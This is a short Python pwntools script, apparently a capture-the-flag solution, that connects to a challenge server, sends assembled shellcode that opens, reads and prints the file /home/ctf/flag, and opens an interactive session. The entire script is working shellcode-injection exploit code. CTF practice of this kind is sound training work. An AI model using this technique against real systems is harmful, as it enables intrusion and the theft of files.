#!/usr/bin/env python3
from pwn import *

context(arch='amd64', terminal=['tmux', 'neww'])
r = remote('bamboofox.cs.nctu.edu.tw', 11101)
LEN = 64

shellcode = ''
shellcode += shellcraft.open("/home/ctf/flag")
shellcode += shellcraft.read('rax', 'rsp', LEN)
shellcode += shellcraft.write(1, 'rsp', LEN)

print(shellcode)
r.recvuntil(':')
r.sendline(asm(shellcode))
r.interactive()
